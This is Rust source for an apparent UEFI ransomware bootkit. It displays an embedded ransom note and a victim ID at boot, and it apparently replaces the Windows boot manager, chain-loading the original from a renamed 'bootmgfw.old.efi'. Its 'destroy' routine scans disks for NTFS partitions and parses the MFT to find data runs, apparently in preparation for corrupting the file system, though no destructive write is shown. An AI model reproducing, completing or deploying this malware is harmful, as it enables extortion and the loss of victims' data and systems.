#![no_main]
#![no_std]
#![feature(abi_efiapi)]
#![feature(slice_as_chunks)]

mod mbr;
mod gpt;
mod file;

extern crate alloc;

use core::fmt::{Write};
use uefi::prelude::*;
use uefi::{Char16, Event, ResultExt};
use uefi::proto::console::text::{Color, Key};
use alloc::string::{String, ToString};
use alloc::{vec};
use alloc::vec::Vec;
use core::ops::{Deref, Range};
use core::str;
use uefi::proto::media::block::{BlockIO};
use uefi::table::runtime::ResetType;
use crate::gpt::{GPTDisk};
use crate::mbr::MBR;
use crate::file::read_file;

fn read_mft_entry(blk: &BlockIO, media_id: u32, entry_nb: u64, mut buf: &mut [u8], entry_buf: &mut [u8]) -> Result<(), ()> {
    blk.read_blocks(media_id, entry_nb, &mut buf).unwrap_success();

    if &buf[0..4] != [70, 73, 76, 69] && &buf[0..4] != [66, 65, 65, 68] { // FILE or BAAD
        return Err(())
    }

    for i in 0..512 { entry_buf[i] = buf[i] }

    blk.read_blocks(media_id, entry_nb+1, &mut buf).unwrap_success();
    for i in 0..512 { entry_buf[i+512] = buf[i] }

    Ok(())
}

fn destroy(st: &SystemTable<Boot>) {
    let handles = st
        .boot_services()
        .find_handles::<BlockIO>()
        .expect_success("failed to find handles for `BlockIO`");

    for handle in handles {
        let blk = st
            .boot_services()
            .handle_protocol::<BlockIO>(handle)
            .expect_success("Failed to get BlockIO protocol");

        let blk = unsafe {&* blk.get()};

        let blk_media = blk.media();
        let media_id = blk_media.media_id();
        let block_size = blk_media.block_size();
        let low_lba = blk_media.lowest_aligned_lba();

        let mut buf: Vec<u8> = vec![0u8; block_size as usize];

        blk.read_blocks(media_id, low_lba, &mut buf).unwrap_success();

        let data= buf.as_slice();

        match MBR::new(data, media_id) {
            Ok(m) => {
                if !m.is_gpt_pmbr() { continue }
            },
            Err(_) => {
                continue
            }
        };

        blk.read_blocks(media_id, 1, &mut buf).unwrap_success();
        let gpt_disk = GPTDisk::new(blk, media_id, block_size, &mut buf);

        for partition in gpt_disk.partitions() {
            if partition.part_type_guid.to_string() == "ebd0a0a2-b9e5-4433-87c0-68b6b72699c7" {
                blk.read_blocks(media_id, partition.first_lba, &mut buf).unwrap_success();
                let mft_lcn = u64::from_ne_bytes(buf[48..56].try_into().unwrap());
                let mft_start_sector = (mft_lcn*8)+partition.first_lba;

                let mut mft_entry_buf = [0u8; 1024];
                read_mft_entry(blk, media_id, mft_start_sector, &mut buf, &mut mft_entry_buf).unwrap();

                let mut first_attribute_offset = u16::from_ne_bytes(mft_entry_buf[20..22].try_into().unwrap()) as usize;
                let mut data_run_offset = 0;
                loop {
                    if mft_entry_buf[first_attribute_offset] == 0x80 {
                        log::info!("Found it !");
                        data_run_offset = u16::from_ne_bytes(mft_entry_buf[first_attribute_offset+32..first_attribute_offset+34].try_into().unwrap()) as usize;
                        data_run_offset += first_attribute_offset;
                        break;
                    } else if mft_entry_buf[first_attribute_offset] == 0xFF {
                        break;
                    } else {
                        let length = u32::from_ne_bytes(mft_entry_buf[first_attribute_offset+4..first_attribute_offset+8].try_into().unwrap()) as usize;

                        first_attribute_offset += length
                    }
                }

                if data_run_offset == 0 {continue};

                let cluster_count = u16::from_ne_bytes(mft_entry_buf[data_run_offset+1..data_run_offset+3].try_into().unwrap());
                log::info!("{}", cluster_count);

            }
        }
    }
}

fn init_screen(st: &mut SystemTable<Boot>) {
    st.stdout().clear().unwrap().unwrap();
    st.stdout().enable_cursor(true).unwrap_success();
    st.stdout().set_color(Color::Red, Color::Black).unwrap_success();
    st.stdout().write_str(include_str!("ransom_note.txt")).unwrap();

    match read_file(&st, "id") {
        Ok(buf) => {
            let content = str::from_utf8(&buf).unwrap();
            st.stdout().write_str(content).unwrap();
        },
        Err(_) => { st.stdout().write_str("File not found").unwrap(); }
    }

    st.stdout().write_str("\n> ").unwrap();
}

fn take_input(image_handle: &Handle, system_table: &mut SystemTable<Boot>, char_16: Char16, buffer: &mut String) {
    let mut st = unsafe {system_table.unsafe_clone()};
    let stdout = system_table.stdout();
    let char_key = char::from(char_16);
    match char_key {

        // When user press [Enter]
        '\r' => {
            if buffer == "clear" {
                stdout.clear().unwrap_success();
                init_screen(&mut st);
                buffer.clear();
            } else if buffer == "test" {

                destroy(system_table);

            } else if buffer == "boot" {
                // The whole thing doesn't work

                let windows_efi = match read_file(&system_table, "EFI\\Microsoft\\Boot\\bootmgfw.old.efi") {
                    Ok(t) => t,
                    Err(_) => panic!("Windows efi file not found")
                };

                let windows_handle = match system_table
                    .boot_services()
                    .load_image_from_buffer(*image_handle, windows_efi.deref()) {
                    Ok(h) => h.unwrap(),
                    Err(e) => {
                        log::info!("Load image : KO : {:#?}", e);
                        panic!()
                    }
                };

                match system_table.boot_services().start_image(windows_handle) {
                    Ok(_) => log::info!("OK"),
                    Err(e) => log::info!("Start image : KO : {:#?}", e) //TODO: That doesn't work !!
                }

            }
            else if buffer == "shutdown" {

                system_table.runtime_services().reset(
                    ResetType::Shutdown,
                    Status::SUCCESS,
                    Some(&[])
                );

            } else {
                stdout.write_char('\n').unwrap();
                stdout.write_str(buffer.as_str()).unwrap();
                stdout.write_str("\n> ").unwrap();
                buffer.clear();
            }
        }

        // When user press [Backspace]
        '\x08' => {
            if buffer.len() == 0 { return; } else {
                buffer.pop();
                stdout.write_char(char_key).unwrap();
            }
        }

        // Whatever character
        _ => {
            buffer.push(char_key);
            stdout.write_char(char_key).unwrap();
        }
    }
}

fn wait_for_input(boot_services: &BootServices, events: &mut [Event; 1]) {
    boot_services.wait_for_event(events).unwrap().unwrap();
}

#[entry]
fn main(handle: Handle, mut st: SystemTable<Boot>) -> Status {
    uefi_services::init(&mut st).unwrap_success();

    init_screen(&mut st);
    let mut buffer: String = String::from("");

    let mut key_event = unsafe { [st.stdin().wait_for_key_event().unsafe_clone()] };

    loop {
        wait_for_input(st.boot_services(), &mut key_event);
        if let Some(Key::Printable(key)) = st.stdin().read_key().unwrap_success() {
            take_input(&handle, &mut st, key, &mut buffer);
        }
    }

    //Status::SUCCESS
}
